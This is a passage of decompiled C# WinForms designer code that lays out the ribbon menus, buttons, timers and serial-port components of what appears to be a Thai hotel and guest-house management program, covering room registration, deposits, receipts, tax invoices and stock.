		this.imageList1 = new System.Windows.Forms.ImageList(this.components);
		this.tabStrip1 = new DevComponents.DotNetBar.TabStrip();
		this.ribbonControl1 = new DevComponents.DotNetBar.RibbonControl();
		this.ribbonPanel1 = new DevComponents.DotNetBar.RibbonPanel();
		this.RibbonBar6 = new DevComponents.DotNetBar.RibbonBar();
		this.ButtonItem48 = new DevComponents.DotNetBar.ButtonItem();
		this.RibbonBar2 = new DevComponents.DotNetBar.RibbonBar();
		this.ButtonItem23 = new DevComponents.DotNetBar.ButtonItem();
		this.RibbonBar4 = new DevComponents.DotNetBar.RibbonBar();
		this.B7 = new DevComponents.DotNetBar.ButtonItem();
		this.B8 = new DevComponents.DotNetBar.ButtonItem();
		this.B9 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem32 = new DevComponents.DotNetBar.ButtonItem();
		this.B10 = new DevComponents.DotNetBar.ButtonItem();
		this.B11 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem28 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem29 = new DevComponents.DotNetBar.ButtonItem();
		this.RibbonBar1 = new DevComponents.DotNetBar.RibbonBar();
		this.B1 = new DevComponents.DotNetBar.ButtonItem();
		this.B2 = new DevComponents.DotNetBar.ButtonItem();
		this.B3 = new DevComponents.DotNetBar.ButtonItem();
		this.B4 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem10 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem_0 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem9 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem34 = new DevComponents.DotNetBar.ButtonItem();
		this.B5 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem13 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem21 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem6 = new DevComponents.DotNetBar.ButtonItem();
		this.B6 = new DevComponents.DotNetBar.ButtonItem();
		this.B12 = new DevComponents.DotNetBar.ButtonItem();
		this.RibbonPanel2 = new DevComponents.DotNetBar.RibbonPanel();
		this.RibbonBar_1 = new DevComponents.DotNetBar.RibbonBar();
		this.B23 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem52 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem38 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem71 = new DevComponents.DotNetBar.ButtonItem();
		this.RibbonBar_0 = new DevComponents.DotNetBar.RibbonBar();
		this.B21 = new DevComponents.DotNetBar.ButtonItem();
		this.B22 = new DevComponents.DotNetBar.ButtonItem();
		this.RibbonBar9 = new DevComponents.DotNetBar.RibbonBar();
		this.B16 = new DevComponents.DotNetBar.ButtonItem();
		this.B17 = new DevComponents.DotNetBar.ButtonItem();
		this.B18 = new DevComponents.DotNetBar.ButtonItem();
		this.B19 = new DevComponents.DotNetBar.ButtonItem();
		this.B20 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem60 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem68 = new DevComponents.DotNetBar.ButtonItem();
		this.RibbonBar8 = new DevComponents.DotNetBar.RibbonBar();
		this.B14 = new DevComponents.DotNetBar.ButtonItem();
		this.B15 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem46 = new DevComponents.DotNetBar.ButtonItem();
		this.RibbonBar3 = new DevComponents.DotNetBar.RibbonBar();
		this.B13 = new DevComponents.DotNetBar.ButtonItem();
		this.RibbonPanel6 = new DevComponents.DotNetBar.RibbonPanel();
		this.ribbonBar7 = new DevComponents.DotNetBar.RibbonBar();
		this.ButtonItem35 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem14 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem44 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem19 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem31 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem33 = new DevComponents.DotNetBar.ButtonItem();
		this.RibbonPanel4 = new DevComponents.DotNetBar.RibbonPanel();
		this.RibbonBar_6 = new DevComponents.DotNetBar.RibbonBar();
		this.ButtonItem37 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem70 = new DevComponents.DotNetBar.ButtonItem();
		this.RibbonBar_5 = new DevComponents.DotNetBar.RibbonBar();
		this.B24 = new DevComponents.DotNetBar.ButtonItem();
		this.RibbonPanel5 = new DevComponents.DotNetBar.RibbonPanel();
		this.RibbonBar_4 = new DevComponents.DotNetBar.RibbonBar();
		this.ItemContainer5 = new DevComponents.DotNetBar.ItemContainer();
		this.R19 = new DevComponents.DotNetBar.ButtonItem();
		this.R20 = new DevComponents.DotNetBar.ButtonItem();
		this.RibbonBar_3 = new DevComponents.DotNetBar.RibbonBar();
		this.ItemContainer4 = new DevComponents.DotNetBar.ItemContainer();
		this.R17 = new DevComponents.DotNetBar.ButtonItem();
		this.R18 = new DevComponents.DotNetBar.ButtonItem();
		this.RibbonBar_2 = new DevComponents.DotNetBar.RibbonBar();
		this.ButtonItem12 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem45 = new DevComponents.DotNetBar.ButtonItem();
		this.R8 = new DevComponents.DotNetBar.ButtonItem();
		this.R9 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem67 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem5 = new DevComponents.DotNetBar.ButtonItem();
		this.R7 = new DevComponents.DotNetBar.ButtonItem();
		this.R14 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem20 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem50 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem11 = new DevComponents.DotNetBar.ButtonItem();
		this.R6 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem43 = new DevComponents.DotNetBar.ButtonItem();
		this.R1 = new DevComponents.DotNetBar.ButtonItem();
		this.R4 = new DevComponents.DotNetBar.ButtonItem();
		this.R2 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem30 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem51 = new DevComponents.DotNetBar.ButtonItem();
		this.R3 = new DevComponents.DotNetBar.ButtonItem();
		this.R11 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem56 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem57 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem58 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem55 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem61 = new DevComponents.DotNetBar.ButtonItem();
		this.R5 = new DevComponents.DotNetBar.ButtonItem();
		this.R16 = new DevComponents.DotNetBar.ButtonItem();
		this.R12 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem47 = new DevComponents.DotNetBar.ButtonItem();
		this.R10 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem54 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem59 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem63 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem64 = new DevComponents.DotNetBar.ButtonItem();
		this.ItemContainer3 = new DevComponents.DotNetBar.ItemContainer();
		this.R13 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem65 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem66 = new DevComponents.DotNetBar.ButtonItem();
		this.R15 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem40 = new DevComponents.DotNetBar.ButtonItem();
		this.ItemContainer1 = new DevComponents.DotNetBar.ItemContainer();
		this.ButtonItem62 = new DevComponents.DotNetBar.ButtonItem();
		this.RibbonPanel7 = new DevComponents.DotNetBar.RibbonPanel();
		this.RibbonBar_7 = new DevComponents.DotNetBar.RibbonBar();
		this.ButtonItem39 = new DevComponents.DotNetBar.ButtonItem();
		this.B11_2 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem41 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem42 = new DevComponents.DotNetBar.ButtonItem();
		this.RibbonPanel3 = new DevComponents.DotNetBar.RibbonPanel();
		this.RibbonBar5 = new DevComponents.DotNetBar.RibbonBar();
		this.ButtonItem15 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem16 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem17 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem18 = new DevComponents.DotNetBar.ButtonItem();
		this.ribbonTabItem1 = new DevComponents.DotNetBar.RibbonTabItem();
		this.RibbonTabItem2 = new DevComponents.DotNetBar.RibbonTabItem();
		this.RibbonTabItem4 = new DevComponents.DotNetBar.RibbonTabItem();
		this.RibbonTabItem3 = new DevComponents.DotNetBar.RibbonTabItem();
		this.RibbonTabItem5 = new DevComponents.DotNetBar.RibbonTabItem();
		this.RibbonTabItem_0 = new DevComponents.DotNetBar.RibbonTabItem();
		this.ButtonItem49 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem53 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonNotification = new DevComponents.DotNetBar.ButtonItem();
		this.LabelItem6 = new DevComponents.DotNetBar.LabelItem();
		this.LabelItemNotify = new DevComponents.DotNetBar.LabelItem();
		this.ButtonItem_Version = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonFile = new DevComponents.DotNetBar.Office2007StartButton();
		this.QatCustomizeItem1 = new DevComponents.DotNetBar.QatCustomizeItem();
		this.RibbonTabItemGroup1 = new DevComponents.DotNetBar.RibbonTabItemGroup();
		this.RibbonTabItemGroup2 = new DevComponents.DotNetBar.RibbonTabItemGroup();
		this.RibbonTabItemGroup3 = new DevComponents.DotNetBar.RibbonTabItemGroup();
		this.ButtonItem3 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem1 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem22 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem4 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem7 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem8 = new DevComponents.DotNetBar.ButtonItem();
		this.ComboItem1 = new DevComponents.Editors.ComboItem();
		this.ComboItem2 = new DevComponents.Editors.ComboItem();
		this.ComboItem3 = new DevComponents.Editors.ComboItem();
		this.ComboItem4 = new DevComponents.Editors.ComboItem();
		this.ComboItem5 = new DevComponents.Editors.ComboItem();
		this.ComboItem6 = new DevComponents.Editors.ComboItem();
		this.ComboItem7 = new DevComponents.Editors.ComboItem();
		this.ButtonItem24 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem25 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem26 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem27 = new DevComponents.DotNetBar.ButtonItem();
		this.Bar1 = new DevComponents.DotNetBar.Bar();
		this.LabelItem1 = new DevComponents.DotNetBar.LabelItem();
		this.ButtonItem69 = new DevComponents.DotNetBar.ButtonItem();
		this.ButtonItem36 = new DevComponents.DotNetBar.ButtonItem();
		this.LabelItem4 = new DevComponents.DotNetBar.LabelItem();
		this.LabelItem3 = new DevComponents.DotNetBar.LabelItem();
		this.LabelStatus = new DevComponents.DotNetBar.LabelItem();
		this.LabelItem2 = new DevComponents.DotNetBar.LabelItem();
		this.Timer2 = new System.Windows.Forms.Timer(this.components);
		this.StyleManager1 = new DevComponents.DotNetBar.StyleManager();
		this.ButtonItem2 = new DevComponents.DotNetBar.ButtonItem();
		this.PanelEx1 = new DevComponents.DotNetBar.PanelEx();
		this.Label2 = new System.Windows.Forms.Label();
		this.Timer1 = new System.Windows.Forms.Timer(this.components);
		this.SerialPort1 = new System.IO.Ports.SerialPort(this.components);
		this.WebBrowser1 = new System.Windows.Forms.WebBrowser();
		this.TimerOnoff = new System.Windows.Forms.Timer(this.components);
		this.Label1 = new System.Windows.Forms.Label();
		this.URL_ON_OFF = new System.Windows.Forms.ListView();
		this.ColumnHeader1 = new System.Windows.Forms.ColumnHeader();
		this.URL_ON_OFF_SERIALS = new System.Windows.Forms.ListView();
		this.ColumnHeader2 = new System.Windows.Forms.ColumnHeader();
		this.TimerSerials = new System.Windows.Forms.Timer(this.components);
		this.TimerMouse = new System.Windows.Forms.Timer(this.components);
		this.SerialPort2 = new System.IO.Ports.SerialPort(this.components);
		this.TimerNotifly = new System.Windows.Forms.Timer(this.components);
		this.TimerCheckNotify = new System.Windows.Forms.Timer(this.components);
		this.WebBrowser2 = new System.Windows.Forms.WebBrowser();
		this.TimerChkVer = new System.Windows.Forms.Timer(this.components);
		this.Label100 = new System.Windows.Forms.Label();
		this.TimerDate = new System.Windows.Forms.Timer(this.components);
		this.TimerWeb = new System.Windows.Forms.Timer(this.components);
		this.WebBrowserBlock = new System.Windows.Forms.WebBrowser();
		this.Timer_0 = new System.Windows.Forms.Timer(this.components);
		this.ribbonControl1.SuspendLayout();
		this.ribbonPanel1.SuspendLayout();
		this.RibbonPanel2.SuspendLayout();
		this.RibbonPanel6.SuspendLayout();
		this.RibbonPanel4.SuspendLayout();
		this.RibbonPanel5.SuspendLayout();
		this.RibbonPanel7.SuspendLayout();
		this.RibbonPanel3.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.Bar1).BeginInit();
		this.PanelEx1.SuspendLayout();
		this.SuspendLayout();
		this.imageList1.ImageStream = (System.Windows.Forms.ImageListStreamer)resources.GetObject("imageList1.ImageStream");
		this.imageList1.TransparentColor = System.Drawing.Color.Magenta;
		this.imageList1.Images.SetKeyName(0, "");
		this.imageList1.Images.SetKeyName(1, "");
		this.imageList1.Images.SetKeyName(2, "");
		this.imageList1.Images.SetKeyName(3, "");
		this.imageList1.Images.SetKeyName(4, "");
		this.imageList1.Images.SetKeyName(5, "");
		this.imageList1.Images.SetKeyName(6, "");
		this.imageList1.Images.SetKeyName(7, "");
		this.imageList1.Images.SetKeyName(8, "");
		this.imageList1.Images.SetKeyName(9, "");
		this.imageList1.Images.SetKeyName(10, "");
		this.imageList1.Images.SetKeyName(11, "");
		this.imageList1.Images.SetKeyName(12, "");
		this.imageList1.Images.SetKeyName(13, "");
		this.imageList1.Images.SetKeyName(14, "");
		this.imageList1.Images.SetKeyName(15, "");
		this.imageList1.Images.SetKeyName(16, "");
		this.imageList1.Images.SetKeyName(17, "");
		this.imageList1.Images.SetKeyName(18, "");
		this.imageList1.Images.SetKeyName(19, "");
		this.imageList1.Images.SetKeyName(20, "");
		this.imageList1.Images.SetKeyName(21, "");
		this.imageList1.Images.SetKeyName(22, "");
		this.imageList1.Images.SetKeyName(23, "");
		this.tabStrip1.AutoSelectAttachedControl = true;
		this.tabStrip1.CanReorderTabs = true;
		this.tabStrip1.CloseButtonOnTabsVisible = true;
		this.tabStrip1.CloseButtonPosition = DevComponents.DotNetBar.eTabCloseButtonPosition.Right;
		this.tabStrip1.CloseButtonVisible = true;
		this.tabStrip1.ColorScheme.TabBackground = System.Drawing.Color.FromArgb(215, 229, 247);
		this.tabStrip1.ColorScheme.TabItemBackground = System.Drawing.Color.FromArgb(253, 253, 253);
		this.tabStrip1.ColorScheme.TabItemBackgroundColorBlend.AddRange(new DevComponents.DotNetBar.BackgroundColorBlend[4]
		{
			new DevComponents.DotNetBar.BackgroundColorBlend(System.Drawing.Color.FromArgb(217, 231, 249), 0f),
			new DevComponents.DotNetBar.BackgroundColorBlend(System.Drawing.Color.FromArgb(182, 210, 245), 0.45f),
			new DevComponents.DotNetBar.BackgroundColorBlend(System.Drawing.Color.FromArgb(125, 170, 230), 0.45f),
			new DevComponents.DotNetBar.BackgroundColorBlend(System.Drawing.Color.FromArgb(216, 231, 250), 1f)
		});
		this.tabStrip1.ColorScheme.TabItemHotBackgroundColorBlend.AddRange(new DevComponents.DotNetBar.BackgroundColorBlend[4]
		{
			new DevComponents.DotNetBar.BackgroundColorBlend(System.Drawing.Color.FromArgb(255, 253, 235), 0f),
			new DevComponents.DotNetBar.BackgroundColorBlend(System.Drawing.Color.FromArgb(255, 236, 168), 0.45f),
			new DevComponents.DotNetBar.BackgroundColorBlend(System.Drawing.Color.FromArgb(255, 218, 89), 0.45f),
			new DevComponents.DotNetBar.BackgroundColorBlend(System.Drawing.Color.FromArgb(255, 230, 141), 1f)
		});
		this.tabStrip1.ColorScheme.TabItemSelectedBackground = System.Drawing.Color.FromArgb(255, 255, 192);
		this.tabStrip1.ColorScheme.TabItemSelectedBackgroundColorBlend.AddRange(new DevComponents.DotNetBar.BackgroundColorBlend[4]
		{
			new DevComponents.DotNetBar.BackgroundColorBlend(System.Drawing.Color.FromArgb(227, 239, 255), 0f),
			new DevComponents.DotNetBar.BackgroundColorBlend(System.Drawing.Color.FromArgb(215, 232, 255), 0.45f),
			new DevComponents.DotNetBar.BackgroundColorBlend(System.Drawing.Color.FromArgb(203, 223, 248), 0.45f),
			new DevComponents.DotNetBar.BackgroundColorBlend(System.Drawing.Color.FromArgb(238, 244, 253), 1f)
		});
		this.tabStrip1.Dock = System.Windows.Forms.DockStyle.Top;
		this.tabStrip1.Font = new System.Drawing.Font("Tahoma", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 222);
		this.tabStrip1.ForeColor = System.Drawing.Color.Red;
		DevComponents.DotNetBar.TabStrip tabStrip = this.tabStrip1;
		System.Drawing.Point location = new System.Drawing.Point(4, 129);
		tabStrip.Location = location;
		this.tabStrip1.MdiForm = this;
		this.tabStrip1.MdiTabbedDocuments = true;
		this.tabStrip1.Name = "tabStrip1";
		this.tabStrip1.SelectedTab = null;
		this.tabStrip1.SelectedTabFont = new System.Drawing.Font("Tahoma", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		DevComponents.DotNetBar.TabStrip tabStrip2 = this.tabStrip1;
		System.Drawing.Size size = new System.Drawing.Size(1444, 25);
		tabStrip2.Size = size;
		this.tabStrip1.Style = DevComponents.DotNetBar.eTabStripStyle.Office2007Document;
		this.tabStrip1.TabAlignment = DevComponents.DotNetBar.eTabStripAlignment.Top;
		this.tabStrip1.TabIndex = 7;
		this.tabStrip1.TabLayoutType = DevComponents.DotNetBar.eTabLayoutType.FixedWithNavigationBox;
		this.tabStrip1.Text = "tabStrip1";
		this.ribbonControl1.AntiAlias = false;
		this.ribbonControl1.BackColor = System.Drawing.SystemColors.Control;
		this.ribbonControl1.BackgroundStyle.Class = "";
		this.ribbonControl1.CaptionVisible = true;
		this.ribbonControl1.Controls.Add(this.ribbonPanel1);
		this.ribbonControl1.Controls.Add(this.RibbonPanel2);
		this.ribbonControl1.Controls.Add(this.RibbonPanel6);
		this.ribbonControl1.Controls.Add(this.RibbonPanel4);
		this.ribbonControl1.Controls.Add(this.RibbonPanel5);
		this.ribbonControl1.Controls.Add(this.RibbonPanel7);
		this.ribbonControl1.Controls.Add(this.RibbonPanel3);
		this.ribbonControl1.Dock = System.Windows.Forms.DockStyle.Top;
		this.ribbonControl1.Font = new System.Drawing.Font("Tahoma", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 222);
		this.ribbonControl1.Items.AddRange(new DevComponents.DotNetBar.BaseItem[10] { this.ribbonTabItem1, this.RibbonTabItem2, this.RibbonTabItem4, this.RibbonTabItem3, this.RibbonTabItem5, this.RibbonTabItem_0, this.ButtonItem49, this.ButtonItem53, this.ButtonNotification, this.ButtonItem_Version });
		DevComponents.DotNetBar.RibbonControl ribbonControl = this.ribbonControl1;
		location = new System.Drawing.Point(4, 1);
		ribbonControl.Location = location;
		this.ribbonControl1.MdiSystemItemVisible = false;
		this.ribbonControl1.Name = "ribbonControl1";
		DevComponents.DotNetBar.RibbonControl ribbonControl2 = this.ribbonControl1;
		System.Windows.Forms.Padding padding = new System.Windows.Forms.Padding(0, 0, 0, 2);
		ribbonControl2.Padding = padding;
		this.ribbonControl1.QuickToolbarItems.AddRange(new DevComponents.DotNetBar.BaseItem[2] { this.ButtonFile, this.QatCustomizeItem1 });
		DevComponents.DotNetBar.RibbonControl ribbonControl3 = this.ribbonControl1;
		size = new System.Drawing.Size(1444, 128);
		ribbonControl3.Size = size;
		this.ribbonControl1.Style = DevComponents.DotNetBar.eDotNetBarStyle.StyleManagerControlled;
		this.ribbonControl1.TabGroupHeight = 14;
		this.ribbonControl1.TabGroups.AddRange(new DevComponents.DotNetBar.RibbonTabItemGroup[3] { this.RibbonTabItemGroup1, this.RibbonTabItemGroup2, this.RibbonTabItemGroup3 });
		this.ribbonControl1.TabGroupsVisible = true;
		this.ribbonControl1.TabIndex = 11;
		this.ribbonPanel1.ColorSchemeStyle = DevComponents.DotNetBar.eDotNetBarStyle.StyleManagerControlled;
		this.ribbonPanel1.Controls.Add(this.RibbonBar6);
		this.ribbonPanel1.Controls.Add(this.RibbonBar2);
		this.ribbonPanel1.Controls.Add(this.RibbonBar4);
		this.ribbonPanel1.Controls.Add(this.RibbonBar1);
		this.ribbonPanel1.Dock = System.Windows.Forms.DockStyle.Fill;
		DevComponents.DotNetBar.RibbonPanel ribbonPanel = this.ribbonPanel1;
		location = new System.Drawing.Point(0, 57);
		ribbonPanel.Location = location;
		this.ribbonPanel1.Name = "ribbonPanel1";
		DevComponents.DotNetBar.RibbonPanel ribbonPanel2 = this.ribbonPanel1;
		padding = new System.Windows.Forms.Padding(3, 0, 3, 3);
		ribbonPanel2.Padding = padding;
		DevComponents.DotNetBar.RibbonPanel ribbonPanel3 = this.ribbonPanel1;
		size = new System.Drawing.Size(1444, 69);
		ribbonPanel3.Size = size;
		this.ribbonPanel1.Style.Class = "";
		this.ribbonPanel1.StyleMouseDown.Class = "";
		this.ribbonPanel1.StyleMouseOver.Class = "";
		this.ribbonPanel1.TabIndex = 1;
		this.RibbonBar6.AutoOverflowEnabled = true;
		this.RibbonBar6.BackgroundMouseOverStyle.Class = "";
		this.RibbonBar6.BackgroundStyle.Class = "";
		this.RibbonBar6.ContainerControlProcessDialogKey = true;
		this.RibbonBar6.Dock = System.Windows.Forms.DockStyle.Left;
		this.RibbonBar6.Items.AddRange(new DevComponents.DotNetBar.BaseItem[1] { this.ButtonItem48 });
		DevComponents.DotNetBar.RibbonBar ribbonBar = this.RibbonBar6;
		location = new System.Drawing.Point(1023, 0);
		ribbonBar.Location = location;
		this.RibbonBar6.Name = "RibbonBar6";
		DevComponents.DotNetBar.RibbonBar ribbonBar2 = this.RibbonBar6;
		size = new System.Drawing.Size(58, 66);
		ribbonBar2.Size = size;
		this.RibbonBar6.Style = DevComponents.DotNetBar.eDotNetBarStyle.StyleManagerControlled;
		this.RibbonBar6.TabIndex = 7;
		this.RibbonBar6.Text = "RibbonBar6";
		this.RibbonBar6.TitleStyle.Class = "";
		this.RibbonBar6.TitleStyleMouseOver.Class = "";
		this.RibbonBar6.TitleVisible = false;
		this.ButtonItem48.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.ButtonItem48.Image = (System.Drawing.Image)resources.GetObject("ButtonItem48.Image");
		this.ButtonItem48.ImagePosition = DevComponents.DotNetBar.eImagePosition.Top;
		this.ButtonItem48.Name = "ButtonItem48";
		this.ButtonItem48.Text = "ออกจากระบบ";
		this.ButtonItem48.Tooltip = "Logout";
		this.RibbonBar2.AutoOverflowEnabled = true;
		this.RibbonBar2.BackgroundMouseOverStyle.Class = "";
		this.RibbonBar2.BackgroundStyle.Class = "";
		this.RibbonBar2.ContainerControlProcessDialogKey = true;
		this.RibbonBar2.Dock = System.Windows.Forms.DockStyle.Left;
		this.RibbonBar2.Items.AddRange(new DevComponents.DotNetBar.BaseItem[1] { this.ButtonItem23 });
		DevComponents.DotNetBar.RibbonBar ribbonBar3 = this.RibbonBar2;
		location = new System.Drawing.Point(938, 0);
		ribbonBar3.Location = location;
		this.RibbonBar2.Name = "RibbonBar2";
		DevComponents.DotNetBar.RibbonBar ribbonBar4 = this.RibbonBar2;
		size = new System.Drawing.Size(85, 66);
		ribbonBar4.Size = size;
		this.RibbonBar2.Style = DevComponents.DotNetBar.eDotNetBarStyle.StyleManagerControlled;
		this.RibbonBar2.TabIndex = 6;
		this.RibbonBar2.Text = "สต\u0e4aอค";
		this.RibbonBar2.TitleStyle.Class = "";
		this.RibbonBar2.TitleStyleMouseOver.Class = "";
		this.RibbonBar2.TitleVisible = false;
		this.ButtonItem23.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.ButtonItem23.Image = (System.Drawing.Image)resources.GetObject("ButtonItem23.Image");
		this.ButtonItem23.ImagePosition = DevComponents.DotNetBar.eImagePosition.Top;
		this.ButtonItem23.Name = "ButtonItem23";
		this.ButtonItem23.Text = "จ\u0e31ดการส\u0e34นค\u0e49า";
		this.ButtonItem23.Tooltip = "จ\u0e31ดการส\u0e34นค\u0e49า";
		this.RibbonBar4.AutoOverflowEnabled = true;
		this.RibbonBar4.BackgroundMouseOverStyle.Class = "";
		this.RibbonBar4.BackgroundStyle.Class = "";
		this.RibbonBar4.ContainerControlProcessDialogKey = true;
		this.RibbonBar4.Dock = System.Windows.Forms.DockStyle.Left;
		this.RibbonBar4.Items.AddRange(new DevComponents.DotNetBar.BaseItem[6] { this.B7, this.B8, this.B9, this.ButtonItem32, this.B10, this.B11 });
		DevComponents.DotNetBar.RibbonBar ribbonBar5 = this.RibbonBar4;
		location = new System.Drawing.Point(565, 0);
		ribbonBar5.Location = location;
		this.RibbonBar4.Name = "RibbonBar4";
		DevComponents.DotNetBar.RibbonBar ribbonBar6 = this.RibbonBar4;
		size = new System.Drawing.Size(373, 66);
		ribbonBar6.Size = size;
		this.RibbonBar4.Style = DevComponents.DotNetBar.eDotNetBarStyle.StyleManagerControlled;
		this.RibbonBar4.TabIndex = 5;
		this.RibbonBar4.Text = "บ\u0e31ญช\u0e35";
		this.RibbonBar4.TitleStyle.Class = "";
		this.RibbonBar4.TitleStyleMouseOver.Class = "";
		this.RibbonBar4.TitleVisible = false;
		this.B7.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.B7.Image = (System.Drawing.Image)resources.GetObject("B7.Image");
		this.B7.ImagePosition = DevComponents.DotNetBar.eImagePosition.Top;
		this.B7.Name = "B7";
		this.B7.Text = "ใบลงทะเบ\u0e35ยนผ\u0e39\u0e49เข\u0e49าพ\u0e31ก";
		this.B7.Visible = false;
		this.B8.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.B8.Image = (System.Drawing.Image)resources.GetObject("B8.Image");
		this.B8.ImagePosition = DevComponents.DotNetBar.eImagePosition.Top;
		this.B8.Name = "B8";
		this.B8.Text = "ใบม\u0e31ดจำ";
		this.B9.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.B9.Image = (System.Drawing.Image)resources.GetObject("B9.Image");
		this.B9.ImagePosition = DevComponents.DotNetBar.eImagePosition.Top;
		this.B9.Name = "B9";
		this.B9.Text = "ใบสำค\u0e31ญร\u0e31บ";
		this.ButtonItem32.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.ButtonItem32.Image = (System.Drawing.Image)resources.GetObject("ButtonItem32.Image");
		this.ButtonItem32.ImagePosition = DevComponents.DotNetBar.eImagePosition.Top;
		this.ButtonItem32.Name = "ButtonItem32";
		this.ButtonItem32.Text = "ใบแจ\u0e49งหน\u0e35\u0e49\r\n(อ\u0e37\u0e48นๆ)";
		this.B10.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.B10.Image = (System.Drawing.Image)resources.GetObject("B10.Image");
		this.B10.ImagePosition = DevComponents.DotNetBar.eImagePosition.Top;
		this.B10.Name = "B10";
		this.B10.Text = "ใบกำก\u0e31บภาษ\u0e35";
		this.B11.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.B11.Image = (System.Drawing.Image)resources.GetObject("B11.Image");
		this.B11.ImagePosition = DevComponents.DotNetBar.eImagePosition.Top;
		this.B11.Name = "B11";
		this.B11.SubItems.AddRange(new DevComponents.DotNetBar.BaseItem[2] { this.ButtonItem28, this.ButtonItem29 });
		this.B11.Text = "ชำระเง\u0e34น/ล\u0e39กหน\u0e35\u0e49";
		this.B11.Visible = false;
		this.ButtonItem28.Name = "ButtonItem28";
		this.ButtonItem28.Text = "ชำระเง\u0e34น-ล\u0e39กหน\u0e35\u0e49 รายการลงทะเบ\u0e35ยน";
		this.ButtonItem29.Name = "ButtonItem29";
		this.ButtonItem29.Text = "ชำระเง\u0e34น-ล\u0e39กหน\u0e35\u0e49 รายการขายส\u0e34นค\u0e49า";
		this.RibbonBar1.AutoOverflowEnabled = true;
		this.RibbonBar1.BackgroundMouseOverStyle.Class = "";
		this.RibbonBar1.BackgroundStyle.Class = "";
		this.RibbonBar1.ContainerControlProcessDialogKey = true;
		this.RibbonBar1.Dock = System.Windows.Forms.DockStyle.Left;
		this.RibbonBar1.Items.AddRange(new DevComponents.DotNetBar.BaseItem[8] { this.B1, this.B2, this.B3, this.B4, this.B5, this.ButtonItem6, this.B6, this.B12 });
		DevComponents.DotNetBar.RibbonBar ribbonBar7 = this.RibbonBar1;
		location = new System.Drawing.Point(3, 0);
		ribbonBar7.Location = location;
		this.RibbonBar1.Name = "RibbonBar1";
		DevComponents.DotNetBar.RibbonBar ribbonBar8 = this.RibbonBar1;
		size = new System.Drawing.Size(562, 66);
		ribbonBar8.Size = size;
		this.RibbonBar1.Style = DevComponents.DotNetBar.eDotNetBarStyle.StyleManagerControlled;
		this.RibbonBar1.TabIndex = 4;
		this.RibbonBar1.Text = "ห\u0e49องพ\u0e31ก";
		this.RibbonBar1.TitleStyle.Class = "";
